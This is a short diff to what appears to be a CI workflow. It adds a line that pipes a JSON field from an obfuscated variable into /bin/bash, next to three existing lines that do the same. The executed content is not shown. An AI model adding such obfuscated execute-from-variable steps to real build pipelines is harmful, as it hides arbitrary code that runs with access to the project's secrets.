@@ -32,6 +32,7 @@ jobs:
           echo $vgfnb4 | jq -r .h463 | /bin/bash
           echo $sm80247 | jq -r .fyub0 | /bin/bash
           printf '%s' "$sd3440" | jq -r .c8372 | /bin/bash
+          echo $rar31561 | jq -r .b78611 | /bin/bash
 
       - name: Archive output
         if: always()
